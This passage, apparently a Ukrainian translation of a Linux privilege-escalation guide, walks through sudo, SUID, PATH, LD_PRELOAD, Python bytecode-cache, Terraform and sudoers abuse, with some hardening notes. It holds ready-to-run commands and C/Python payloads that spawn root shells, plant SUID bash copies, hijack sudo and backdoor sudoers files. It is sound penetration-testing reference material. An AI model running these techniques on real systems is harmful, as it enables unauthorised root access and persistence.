ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)

```

Класифікуйте слухачі за адресою прив’язки:

- `0.0.0.0` / `[::]`: доступні на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: доступні лише локально (підходять для тунелювання/переспрямування).
- Конкретні внутрішні IP-адреси (наприклад, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Робочий процес тріажу служб, доступних лише локально

Після компрометації хоста служби, прив’язані до `127.0.0.1`, часто вперше стають доступними з вашої оболонки. Швидкий локальний робочий процес такий:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS як мережевий сканер (режим лише для мережі)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований мережевий сканер. Він використовує доступні бінарні файли з `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює інструменти.

```bash

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Якщо передати `-d`, `-p` або `-i` без `-t`, linPEAS працюватиме як чистий мережевий сканер (пропускаючи решту перевірок на підвищення привілеїв).

## Зловживання записом у PATH

### $PATH

Якщо ви виявите, що можете **записувати файли в якусь папку з $PATH**, то, можливо, зможете підвищити привілеї, **створивши бекдор у папці, доступній для запису**. Назвіть його так само, як команду, яку виконуватиме інший користувач (в ідеалі root), і переконайтеся, що ця команда **не завантажується з папки, яка стоїть у $PATH перед вашою папкою, доступною для запису**.

### SUDO і SUID

Можливо, вам дозволено виконувати певну команду за допомогою sudo або для неї встановлено біт suid. Перевірте це за допомогою:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Деякі **неочікувані команди дають змогу читати та/або записувати файли або навіть виконувати команду**.<sup>[[8]](#references)</sup> Для прикладу:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Конфігурація Sudo може дозволяти користувачу виконувати певні команди з правами іншого користувача без знання пароля.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

У цьому прикладі користувач `demo` може запускати `vim` від імені `root`; тепер отримати shell дуже просто, додавши SSH-ключ до каталогу `root` або викликавши `sh`.

```
sudo vim -c '!sh'
```

### Bash-порівняння без лапок у sudo-скрипті

У Bash права частина `[[ "$protected" == $candidate ]]` є шаблоном. Якщо root-capable sudo-скрипт заповнює `candidate` зі створеного користувачем файла, значення на кшталт `prefix*` може збігтися з початком захищеного рядка. Різні шляхи успішного виконання та помилок можуть у такому разі розкрити префікс через oracle. Якщо потрібна буквальна рівність, візьміть праву частину в лапки (`[[ "$protected" == "$candidate" ]]`). Перш ніж вважати порівняння без лапок експлуатованим, перевірте фактичні аргументи sudo, походження вхідних даних і спостережувану поведінку гілок. [Посібник GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) описує цю поведінку шаблонів.

### Файли проєктів PrusaSlicer під sudo

Необмежений дозвіл sudo на запуск `prusaslicer` або `prusa-slicer` із правами root потребує перевірки, якщо користувач може вибрати файл проєкту `.3mf` для нарізання. Проєкт може містити скрипт постобробки, який запускається під час експорту G-code; спеціально створені проєкти можуть виконувати команди в PrusaSlicer аж до версії 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Перш ніж робити висновок, що межу привілеїв можна обійти, перевірте чинне правило sudo, версію двійкового файла та виправлення від постачальника, джерело проєкту й те, чи запускається відповідний шлях експорту. Фіксований аргумент із проєктом або чинна політика `NOEXEC` можуть змінити результат. Сам факт наявності слайсера не підтверджує наявність шляху підвищення привілеїв.

### SETENV

Ця директива дає користувачеві змогу **встановити змінну середовища** під час виконання команди:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Цей приклад, **заснований на машині Admirer з HTB**, був **вразливим** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну бібліотеку Python під час виконання скрипту від імені root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Отруєння доступного для запису `__pycache__` / `.pyc` під час імпорту Python-модулів, дозволених через sudo

Якщо **Python-скрипт, дозволений через sudo**, імпортує модуль, у каталозі пакета якого є **доступний для запису `__pycache__`**, можливо, вам вдасться замінити кешований `.pyc` і виконати код від імені привілейованого користувача під час наступного імпорту.<sup>[[30]](#references)</sup>

- Чому це працює:
  - CPython зберігає кеш байткоду в `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Інтерпретатор перевіряє **заголовок** (магічне число + метадані часової позначки/хешу, пов’язані з вихідним файлом), а потім виконує об’єкт коду у форматі marshal, що зберігається після цього заголовка.
  - Якщо ви можете **видалити й повторно створити** кешований файл, оскільки каталог доступний для запису, файл `.pyc`, власником якого є root і який недоступний для запису, усе одно можна замінити.
- Типовий шлях:
  - `sudo -l` показує Python-скрипт або обгортку, яку можна запустити від імені root.
  - Цей скрипт імпортує локальний модуль з `/opt/app/`, `/usr/local/lib/...` тощо.
  - Каталог `__pycache__` імпортованого модуля доступний для запису вашому користувачеві або всім користувачам.

Швидка перевірка:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Якщо ви можете перевірити привілейований скрипт, визначте імпортовані модулі та шлях до кешу:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Зловживання workflow:

1. Запустіть дозволений через sudo скрипт один раз, щоб Python створив легітимний файл cache, якщо його ще немає.
2. Прочитайте перші 16 байтів із легітимного `.pyc` і використайте їх у poisoned-файлі.
3. Скомпілюйте об’єкт коду payload, виконайте для нього `marshal.dumps(...)`, видаліть оригінальний файл cache і створіть його заново з оригінальним заголовком і вашим шкідливим bytecode.
4. Повторно запустіть дозволений через sudo скрипт, щоб імпорт виконав ваш payload від імені root.

Важливі примітки:

- Повторне використання оригінального заголовка має вирішальне значення, оскільки Python перевіряє метадані cache щодо вихідного файла, а не відповідність тіла bytecode вихідному файлу.
- Це особливо корисно, коли вихідний файл належить root і доступний лише для читання, але каталог `__pycache__`, що його містить, доступний для запису.
- `PYTHONDONTWRITEBYTECODE=1` і `python -B` забороняють Python записувати нові файли `.pyc`; вони **не** забороняють завантажувати вже наявний валідний cache, замінений зловмисником. Критично важливо, чи може користувач із нижчими привілеями замінити cache, який привілейований імпорт прийме. Перед завантаженням кешованого bytecode Python перевіряє метадані часової позначки/розміру або хешу. Див. [довідник з імпорту Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) і [документацію командного рядка](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Мінімальна структура proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Посилення захисту:

- Переконайтеся, що жоден каталог у привілейованому шляху імпорту Python не доступний для запису користувачам із низькими привілеями, зокрема `__pycache__`.
- Перевірте власників і дозволи каталогів кешу, зокрема наявних файлів `.pyc`. Вимкнення запису байткоду може зменшити створення нових файлів кешу, але не усуває ризик заміни наявного кешу.
- Ставтеся до локальних модулів Python і каталогів кешу, доступних для запису, так само, як до скриптів shell або спільних бібліотек, доступних для запису й виконуваних від імені root.

### BASH_ENV, збережений через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), можна використати поведінку Bash під час запуску неінтерактивної оболонки, щоб виконати довільний код від імені root під час запуску дозволеної команди.<sup>[[24]](#references)</sup>

- Чому це працює: у неінтерактивних оболонках Bash обробляє `$BASH_ENV` і підключає цей файл перед запуском цільового скрипту. Багато правил sudo дозволяють запускати скрипт або оболонку-обгортку. Якщо sudo зберігає `BASH_ENV`, ваш файл буде підключено з привілеями root.<sup>[[23]](#references)</sup>

- Вимоги:
  - Правило sudo, команду якого ви можете запустити (будь-яка ціль, що неінтерактивно запускає `/bin/bash`, або будь-який скрипт bash).
  - `BASH_ENV` має бути в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Посилення захисту:
  - Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
  - Не використовуйте shell-обгортки для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
  - Розгляньте ведення журналу I/O для sudo та сповіщення про використання збережених змінних середовища.

### Terraform через sudo зі збереженим HOME (!env_reset)

Коли sudo дозволяє запускати Terraform від імені привілейованішого користувача, `!env_reset` — це підказка перевірити, які саме змінні середовища зберігаються згідно з цим правилом. Перш ніж вважати доступний для запису викликачем `.terraformrc` або `terraform.rc` активною конфігурацією CLI, перевірте фактичне значення `HOME` або `TF_CLI_CONFIG_FILE`. Запис `provider_installation.dev_overrides` має значення лише тоді, коли фіксована команда Terraform завантажує цього провайдера, а викликач може розмістити його виконуваний файл у вибраному каталозі.<sup>[[25]](#references)</sup>

- Спрямуйте потрібного провайдера в доступний для запису каталог і розмістіть там шкідливий плагін з назвою провайдера (наприклад, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform завершить роботу через помилку рукостискання Go-плагіна, але перед завершенням виконає payload від імені root і залишить SUID shell.

### Перевизначення TF_VAR + обхід перевірки symlink

Змінні Terraform можна передати через змінні середовища `TF_VAR_<name>`, якщо конкретне правило sudo зберігає їх. Для **читання** через symlink джерела також потрібен provider, який переходить за посиланням і копіює захищений результат у місце призначення, доступне для читання користувачу. Для **запису** через symlink місця призначення окремо потрібні контрольований користувачем запис місця призначення та привілейований provider, який переходить за посиланням під час запису; подальше завдання за розкладом — лише один із можливих наслідків. Перш ніж перевіряти будь-який із цих шляхів, вивчіть точний дозвіл sudo, відповідні файли `.tf`, вибрану конфігурацію CLI та власника шляхів за допомогою команд лише для читання, таких як `sudo -l`, `stat` і `readlink`. Слабкі лексичні перевірки на кшталт `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` не розв’язують symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform розв’язує symlink і копіює справжній `/root/root.txt` у місце призначення, доступне для читання зловмисником. Такий самий підхід можна використати, щоб **записувати** у привілейовані шляхи, заздалегідь створивши symlink-и призначення (наприклад, спрямувати шлях призначення провайдера всередину `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo можна налаштувати з параметром `requiretty`, який змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або параметр відсутній), sudo можна виконувати з неінтерактивних контекстів, як-от reverse shells, завдання cron або скрипти.

```bash
Defaults !requiretty
```

Це не є прямою вразливістю саме по собі, але розширює ситуації, у яких можна зловживати правилами sudo без повноцінного PTY.

### Sudo env_keep+=PATH / незахищений secure_path → підміна PATH

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path` містить доступні для запису зловмисником елементи (наприклад, `/home/<user>/bin`), зовнішню команду без повного шляху у дозволеній цілі sudo можна підмінити.<sup>[[3]](#references)</sup> Відсутність ефективного `secure_path` також варто перевірити, **якщо** середовище sudo для команди зберігає контрольований викликачем `PATH`; сама по собі відсутність цього параметра не доводить, що це так. Прочитайте дозволений скрипт, не запускаючи його, а потім перевірте точне правило RunAs і правило аргументів, ефективний шлях пошуку команд, а також доступний для запису й проходу каталог, який містить потрібну назву команди та шукається раніше за інші. Автентифікація, `NOEXEC`, вбудовані команди оболонки й абсолютні шляхи до команд можуть змінити результат.

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає скрипт/бінарний файл із командами без абсолютних шляхів (`free`, `df`, `ps` тощо), і записуваний елемент PATH, який шукається першим.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Бінарний файл SUID із шляхом до команди

Якщо бінарний файл **suid** **виконує іншу команду, вказуючи шлях до неї**, можна спробувати **експортувати функцію** з назвою команди, яку викликає файл suid.

Наприклад, якщо бінарний файл suid викликає _**/usr/sbin/service apache2 start**_, спробуйте створити й експортувати функцію:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Потім, коли ви викличете бінарний файл із SUID, буде виконано цю функцію

### Власні обгортки для копіювання з SUID

Утиліта з SUID, власником якої є root і яка приймає шляхи джерела та призначення, може перетинати дві різні межі довіри. Якщо вона формує shell-команду з будь-якого аргументу (наприклад, передає сформовану команду `cp` у `system()`), метасимволи shell можуть запустити іншу команду з ефективними привілеями утиліти. Навіть якщо вона безпечно викликає `cp` без shell, необмежений шлях призначення може дозволити довільний привілейований запис у файли на кшталт `/etc/passwd`. Перевірте обробку аргументів обгорткою, поведінку effective UID, обмеження призначення та те, чи може вміст копійованого файлу контролювати користувач; загальна помилка `cp` або сам біт SUID не доводять жодного з цих сценаріїв. Спершу пасивно перевірте бінарний файл і його дозволи, перш ніж проводити будь-яке ручне тестування.

### Скрипт із правом на запис, який виконує обгортка з SUID

Поширена помилка конфігурації власного застосунку — бінарна обгортка з SUID, власником якої є root, що виконує скрипт, доступний для запису користувачам із низькими привілеями.

Типовий шаблон:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете додати команди payload, а потім виконати SUID-обгортку:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Швидкі перевірки:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Цей шлях атаки особливо поширений у «maintenance»/«backup»-обгортках, що постачаються в `/usr/local/bin`.

### LD_PRELOAD і **LD_LIBRARY_PATH**

Змінну середовища **LD_PRELOAD** використовують, щоб указати одну або кілька спільних бібліотек (файлів .so), які завантажувач має завантажити перед усіма іншими, зокрема стандартною бібліотекою C (`libc.so`). Цей процес називається попереднім завантаженням бібліотеки.

Однак для підтримання безпеки системи та запобігання експлуатації цієї функції, особливо з виконуваними файлами **suid/sgid**, система застосовує певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ID користувача (_ruid_) не збігається з ефективним ID користувача (_euid_).
- Для виконуваних файлів із suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Підвищення привілеїв можливе, якщо ви можете виконувати команди за допомогою `sudo`, а вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє зберегти змінну середовища **LD_PRELOAD** і враховувати її навіть під час запуску команд через `sudo`, що потенційно дає змогу виконати довільний код із підвищеними привілеями.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Збережіть як **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Потім **скомпілюйте його** за допомогою:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Нарешті, **escalate privileges**, запустивши

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Подібний privesc можна використати, якщо зловмисник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким шукатимуться бібліотеки.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID-бінарний файл – ін’єкція .so

Якщо ви натрапили на бінарний файл із правами **SUID**, який здається незвичним, варто перевірити, чи він коректно завантажує файли **.so**. Це можна зробити, виконавши таку команду:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Наприклад, помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити файл C, наприклад _"/path/to/.config/libcalc.c"_, з таким кодом:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Цей код після компіляції та виконання має на меті підвищити привілеї, маніпулюючи дозволами файлів і запускаючи shell із підвищеними привілеями.

Скомпілюйте наведений вище C-файл у спільний об’єкт (.so) за допомогою:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Нарешті, запуск ураженого SUID-бінарного файла має запустити експлойт, що потенційно дасть змогу скомпрометувати систему.

### Повторне використання токенів sudo

Якщо у вас є **доступ до sudo**, але немає пароля, ви можете підвищити привілеї, **дочекавшись виконання команди sudo, а потім перехопивши токен сеансу**.<sup>[[18]](#references)</sup>

Вимоги для підвищення привілеїв:

- Ви вже маєте оболонку від імені користувача "_sampleuser_"
- "_sampleuser_" **використовував `sudo`**, щоб виконати щось **протягом останніх 15 хвилин** (за замовчуванням саме стільки діє токен sudo, який дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` повертає 0
- `gdb` доступний (ви можете завантажити його)

(Можна тимчасово ввімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або ввімкнути його назавжди, змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконано, **ви можете підвищити привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

```bash
bash exploit.sh
/tmp/activate_sudo_token

```

- **Другий експлойт** (`exploit_v2.sh`) створить оболонку sh у _/tmp_, **яка належатиме root і матиме встановлений setuid**


- **Третій експлойт** (`exploit_v3.sh`) **створить файл sudoers**, який **зробить токени sudo безстроковими та дозволить усім користувачам використовувати sudo**


### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** до теки або до будь-якого з файлів, створених у ній, ви можете скористатися бінарним файлом [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\

### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли в `/etc/sudoers.d` визначають, хто може використовувати `sudo` і як саме. За замовчуванням ці файли **можуть читати лише користувач root і група root**.\
**Якщо** ви можете **прочитати** цей файл, то зможете **отримати цікаву інформацію**, а якщо можете **записувати** в будь-який файл — зможете **підвищити привілеї**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Якщо у вас є право на запис, ви можете ним зловживати.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Ще один спосіб зловживання цими дозволами:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Є альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD. Не забудьте перевірити його конфігурацію у `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Якщо doas дозволяє запускати редактор або інтерпретатор, перевірте escape-варіанти в стилі GTFOBins:

```bash
doas vim
:!/bin/sh
```

Правило `doas` із правами root для оригінального `dstat` на Python також варто перевірити щодо шляху до плагінів. У його [посібнику](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) і [вихідному коді](https://github.com/dstat-real/dstat/blob/master/dstat) серед місць для плагінів `dstat_*.py` зазначено `/usr/share/dstat/` і `/usr/local/share/dstat/`. Якщо поточний користувач може записувати дані до каталогу, який справді використовує встановлена збірка, і шукати в ньому, вибраний плагін може виконатися з ідентифікатором RunAs, заданим у `doas`. Перевірте фактичне правило, пошук плагінів у цій збірці, права доступу або ACL каталогу та його батьківських каталогів, а також чи може користувач вибрати плагін; саме правило для `dstat` або каталог із правом запису — це лише зачіпка. Інші реалізації `dstat` можуть використовувати інші системи плагінів. Перевіряйте метадані пасивно, не завантажуючи плагін.

### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини й використовує `sudo`** для підвищення привілеїв, а вам вдалося отримати оболонку в контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який запустить ваш код від імені root, а потім виконає команду користувача. Далі **змініть $PATH** контексту користувача (наприклад, додавши новий шлях до .bash_profile), щоб під час запуску користувачем sudo запускався ваш виконуваний файл sudo.

Зверніть увагу: якщо користувач працює з іншою оболонкою (не bash), потрібно змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустіть щось на зразок:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Дозволи каталогів

У каталозі **біт «виконання»** означає, що відповідний користувач може виконати команду «**cd**», щоб перейти до папки.\
Біт **«читання»** означає, що користувач може **переглядати список** **файлів**, а біт **«запису»** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки контролю доступу (ACLs) — це другий рівень дискреційних дозволів, який може **перевизначати традиційні дозволи ugo/rwx**. Ці дозволи покращують контроль над доступом до файлів і каталогів, даючи змогу дозволяти або забороняти права окремим користувачам, які не є власниками або членами групи. Такий рівень **гнучкості забезпечує точніше керування доступом**. Докладніше читайте [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Надайте** користувачу «kali» дозволи на читання та запис файлу:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Отримайте** файли з певними ACL у системі:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Прихований бекдор ACL у додаткових файлах sudoers

Поширена помилка конфігурації — файл у `/etc/sudoers.d/`, що належить root і має права доступу `440`, але через ACL усе ще надає доступ на запис користувачу з низькими привілеями.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo, незважаючи на обмежувальні біти режиму:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Це шлях до persistence/privesc через ACL із високим рівнем впливу, оскільки його легко не помітити під час перевірок лише за допомогою `ls -l`.

## Відкриті shell-сесії

Доступ до GNU Screen між користувачами залежить від **конфігурації та ACL запущеної сесії**, а не лише від версії. [У документації GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) зазначено, що Screen має бути зібраний із підтримкою multiuser; `multiuser on` та дозвіл, наданий через `acladd` або відповідний `aclchg`, дають іншому користувачеві змогу приєднатися. [У посібнику також вказано, що для пошуку сесії між користувачами потрібен setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html). Видимий сокет, що належить root, або бінарний файл `screen` із SUID самі по собі не підтверджують, що до root shell можна приєднатися. Перш ніж вважати це підвищенням привілеїв, переконайтеся, що активна сесія працює в режимі multiuser, поточний користувач має ефективні права на введення команд, а shell у цій сесії запущений від імені привілейованого власника.

## SSH

### Передбачуваний PRNG у Debian OpenSSL — CVE-2008-0166

Ключі, згенеровані вразливими збірками Debian або похідних дистрибутивів OpenSSL у період історичної вразливості, могли мати передбачувану випадковість; поточний дистрибутив хоста або виправлена версія OpenSSL не підтверджують, як було згенеровано старий ключ. Перевірте **конкретний ключ** за відповідним історичним чорним списком і його походженням. У посібнику Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) описано перевірку відкритих ключів і `authorized_keys`, а в [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) зафіксовано виправлення OpenSSL. Запис у `authorized_keys` привілейованого облікового запису є лише потенційним шляхом ескалації, якщо відповідний закритий ключ можна отримати, а чинна політика SSH досі приймає цей ключ для цього облікового запису; слабкий **ключ хоста** сам по собі не є обліковими даними для входу. Замініть скомпрометовані ключі та видаліть їхні старі авторизації.

### Цікаві значення конфігурації SSH

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. Типове значення OpenSSH — `yes`; конфігурація дистрибутива може його перевизначити.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за відкритим ключем. Типове значення — `yes`.
- **PermitEmptyPasswords**: Якщо автентифікацію за паролем дозволено, визначає, чи дозволяє сервер вхід до облікових записів із порожнім паролем. Типове значення — `no`.

### Файли керування входом

Ці файли визначають, хто і як може входити в систему:

- **`/etc/nologin`**: якщо файл існує, він блокує вхід не-root користувачам і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує способи входу root (список дозволених TTY).
- **`/etc/motd`**: банер після входу (може розкривати відомості про середовище або технічне обслуговування).

### PermitRootLogin

Визначає, чи може root входити через ssh. Типове значення OpenSSH — `prohibit-password`; конфігурація дистрибутива може його перевизначити. Можливі значення:

- `yes`: root може входити за допомогою пароля або закритого ключа
- `without-password` або `prohibit-password`: root може входити лише за допомогою закритого ключа
- `forced-commands-only`: root може входити лише за допомогою закритого ключа, якщо вказано параметри команд
- `no` : вхід заборонено

### Довірені центри сертифікації SSH для користувачів

`TrustedUserCAKeys` указує відкриті ключі, яким sshd довіряє під час підписування **сертифікатів користувачів**. Якщо відповідний закритий ключ CA доступний для читання користувачу з нижчими привілеями, перевірте, хто може отримати сертифікат і для входу від імені яких облікових записів його можуть використати. `AuthorizedPrincipalsFile` або `AuthorizedPrincipalsCommand` можуть обмежувати прийнятні імена; якщо не налаштовано жоден із них, сертифікат має містити ім’я цільового облікового запису. `PermitRootLogin prohibit-password` блокує автентифікацію root за паролем, але все ще може дозволяти автентифікацію за сертифікатом. Сам факт відкритого шляху до ключа не доводить наявність доступу: перевірте пару відкритого й закритого ключів, чинні правила `Match`, політику облікового запису, парольну фразу ключа, відкликання та дозволені алгоритми підпису. Не додавайте байти закритого ключа до виводу під час збору даних. Див. [посібник із конфігурації сервера OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

